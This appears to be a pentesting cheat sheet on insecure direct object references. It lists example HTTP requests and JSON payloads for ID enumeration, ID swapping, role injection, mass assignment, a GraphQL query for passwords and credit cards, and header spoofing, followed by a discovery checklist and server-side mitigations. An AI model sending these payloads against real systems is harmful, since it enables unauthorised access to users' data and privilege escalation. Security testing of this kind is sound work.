# Insecure Direct Object References

## Horizontal IDOR — Same-Role Object Access
```
# Sequential numeric IDs
GET /api/users/1001
GET /api/users/1002
GET /api/users/1003

# UUID enumeration (if leaked in client-side JS, logs, etc.)
GET /api/orders/a1b2c3d4-...
GET /api/orders/a1b2c3d5-...

# POST body ID swapping
POST /api/update-profile   {"user_id": 42, "email": "attacker@evil.com"}

# WebSocket ID manipulation
{"action":"view","document_id":55}

# Request parameter pollution
GET /api/document?id=55&id=1   # some frameworks use the last value
```
## Vertical IDOR — Privilege Escalation
```
# Direct admin endpoint access as user
GET /admin/users
GET /api/admin/list-all-users
GET /api/users?role=admin

# Role upgrade via body injection
POST /api/update-profile   {"role":"admin"}
POST /api/register         {"role":"admin","is_admin":true}

# Mass assignment — extra fields in JSON body
PUT /api/user   {"id":42, "is_admin":true, "plan":"enterprise", "credit":9999}

# GraphQL — request admin-only fields
POST /graphql  {"query":"query { users { id email password creditCard } }"}

# Insecure direct object reference in headers
GET /api/users   X-Original-User: 1

# Referer-based access
GET /admin/delete-user   Referer: https://target.com/admin
```
## IDOR Discovery Checklist
```
- Change numeric IDs in URLs: /profile/1001 → /profile/1002
- Change UUIDs obtained from client-side source
- Swap user IDs in POST/PUT JSON bodies
- Change account numbers in API parameters
- Add ?user_id=X to any API call
- Try admin-only endpoints directly
- Add role=admin to registration request
- Check GraphQL introspection for hidden fields
- Mass assignment: add unexpected JSON fields
- WebSocket: change IDs mid-stream
- File uploads: change user_id in filename
```
## Mitigation — What to Check Server-Side
```
- Authorization check on EVERY endpoint (not just authN)
- Use WHERE user_id = authenticated_user_id, not user-supplied ID
- Object-level access control middleware
- DTOs (explicitly whitelist writable fields per role)
- UUIDs over sequential IDs (defense in depth, not prevention)
```
## References
- [PortSwigger IDOR](https://portswigger.net/web-security/access-control/idor)
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
